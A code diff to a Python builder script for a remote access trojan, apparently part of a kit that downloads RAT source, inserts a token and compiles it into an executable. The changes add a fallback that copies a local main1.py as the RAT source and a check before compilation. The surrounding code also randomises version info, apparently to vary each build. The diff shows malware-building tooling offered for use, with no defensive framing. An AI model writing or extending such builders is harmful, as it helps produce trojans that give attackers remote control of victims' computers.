@@ -68,10 +68,24 @@ def download_rat_source():
             return True
         else:
             print(f"{Fore.RED}[!] Failed to download RAT source code. Status code: {response.status_code}{Style.RESET_ALL}")
-            return False
+            print(f"{Fore.YELLOW}[*] Using main1.py as fallback...{Style.RESET_ALL}")
+            try:
+                shutil.copy("main1.py", "rat_source.py")
+                print(f"{Fore.GREEN}[+] Using main1.py as RAT source code!{Style.RESET_ALL}")
+                return True
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error using main1.py as fallback: {str(e)}{Style.RESET_ALL}")
+                return False
     except Exception as e:
         print(f"{Fore.RED}[!] Error downloading RAT source code: {str(e)}{Style.RESET_ALL}")
-        return False
+        print(f"{Fore.YELLOW}[*] Using main1.py as fallback...{Style.RESET_ALL}")
+        try:
+            shutil.copy("main1.py", "rat_source.py")
+            print(f"{Fore.GREEN}[+] Using main1.py as RAT source code!{Style.RESET_ALL}")
+            return True
+        except Exception as e2:
+            print(f"{Fore.RED}[!] Error using main1.py as fallback: {str(e2)}{Style.RESET_ALL}")
+            return False
 
 def insert_token(token):
     try:
@@ -107,6 +121,11 @@ def compile_rat(output_name):
     try:
         print(f"{Fore.CYAN}[*] Compiling RAT...{Style.RESET_ALL}")
         
+        # Check if rat_source.py exists
+        if not os.path.exists("rat_source.py"):
+            print(f"{Fore.RED}[!] rat_source.py not found. Cannot compile.{Style.RESET_ALL}")
+            return False
+            
         # Generate random version info
         version = f"{random.randint(1, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
         
